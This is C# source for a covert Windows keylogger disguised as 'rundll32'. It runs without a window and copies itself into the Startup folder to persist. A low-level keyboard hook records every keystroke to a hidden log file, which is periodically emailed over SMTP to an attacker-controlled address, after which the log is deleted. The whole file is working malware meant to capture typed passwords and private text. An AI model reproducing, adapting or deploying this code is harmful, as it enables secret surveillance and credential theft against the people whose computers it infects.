using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace rundll32
{
    class Program
    {
        /*
        for creating hidden applications
        create project as console app
        solution explorer>rightclick properties of project (or alt+enter)
        change output to windows form
        */
        public static string SMTP = null;
        public static int Port = 0;
        public static string Email = null;
        public static string Password = null;
        public static string Resiver = null;
        public static int Turn = 0;
        public static string path = @"C:\Users\Public\Documents\ShadowLog.txt";
        public static int logged = 0;
        //keyboard hook ID
        private const int WH_KEYBOARD_LL = 13;
        //VK stuff
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        //run hook
        public static void Main()

        {

            try
            { File.Delete(path); }
            catch (Exception)
            { }

            byte[] Stub = System.IO.File.ReadAllBytes(Application.ExecutablePath.ToString());
            byte[] ConfigArry = new byte[512];
            Array.ConstrainedCopy(Stub, Stub.Length - 512, ConfigArry, 0, 512);
            string ConfigString = Encoding.UTF8.GetString(ConfigArry).TrimEnd('\x00');
            string[] Config = new string[6];
            Config = ConfigString.Split(',');
            SMTP = Config[0];
            Port = Convert.ToInt32(Config[1]);
            Email = Config[2];
            Password = Config[3];
            Resiver = Config[4];
            Turn = Convert.ToInt32(Config[5]); 
            //get current exe name and path
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            String filePath = Path.Combine(Environment.CurrentDirectory, fileName);

            //check if file exists first; errors out otherwise
            String testpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "rundll32.exe");
            if (!File.Exists(testpath))
            {
                //copy exe into startup folder
                try
                {File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), fileName));}
                catch (Exception)
                {}
               
            }

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        //write data to temp directory
        public static void WriteFile(string ToWrite)
        {
            try
            {
                //directory to write to
                string appendText = null;
                if (ToWrite == "Return")
                { appendText = Environment.NewLine; }
                else if (ToWrite == "Space")
                { appendText = " "; }
                else if (ToWrite == "NumPad0")
                { appendText = "0"; }
                else if (ToWrite == "NumPad1")
                { appendText = "1"; }
                else if (ToWrite == "NumPad2")
                { appendText = "2"; }
                else if (ToWrite == "NumPad3")
                { appendText = "3"; }
                else if (ToWrite == "NumPad4")
                { appendText = "4"; }
                else if (ToWrite == "NumPad5")
                { appendText = "5"; }
                else if (ToWrite == "NumPad6")
                { appendText = "6"; }
                else if (ToWrite == "NumPad7")
                { appendText = "7"; }
                else if (ToWrite == "NumPad8")
                { appendText = "8"; }
                else if (ToWrite == "NumPad9")
                { appendText = "9"; }
                else if (ToWrite == "D1")
                { appendText = "!"; }
                else if (ToWrite == "D2")
                { appendText = "@"; }
                else if (ToWrite == "D3")
                { appendText = "#"; }
                else if (ToWrite == "D4")
                { appendText = "$"; }
                else if (ToWrite == "D5")
                { appendText = "%"; }
                else if (ToWrite == "D6")
                { appendText = "^"; }
                else if (ToWrite == "D7")
                { appendText = "&"; }
                else if (ToWrite == "D8")
                { appendText = "*"; }
                else if (ToWrite == "D9")
                { appendText = "("; }
                else if (ToWrite == "D0")
                { appendText = ")"; }
                else if (ToWrite.Length > 1)
                { appendText = " " + ToWrite + " "; }
                else
                { appendText = ToWrite; }
                File.AppendAllText(path, appendText);
            }
            catch (Exception)
            {Application.Exit();}
            
        }

        //create keyboard hook
        private static IntPtr SetHook(LowLevelKeyboardProc proc)

        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        //actual logging code
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string output = Convert.ToString((Keys)vkCode);
                WriteFile(output);
                logged++;
                if (logged == Turn)
                {
                    //send email and restart
                    email_send();
                    try
                    {File.Delete(path);}
                    catch (Exception)
                    {}
                    Application.Restart();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        //send captured keystrokes to fake gmail account to check later
        public static void email_send()
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient(SMTP);
            mail.From = new MailAddress(Email);
            mail.To.Add(Resiver);
            mail.Subject = "P-log "+Environment.MachineName.ToString();
            mail.Body = "KeyLog Attachment";
            Attachment attachment;
            attachment = new Attachment(path);
            mail.Attachments.Add(attachment);
            SmtpServer.Port = Port;
            SmtpServer.Credentials = new NetworkCredential(Email, Password);
            SmtpServer.EnableSsl = true;

            try
            {
                SmtpServer.Send(mail);
            }
            catch (Exception)
            { }
            
        }

        //import windows processes
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}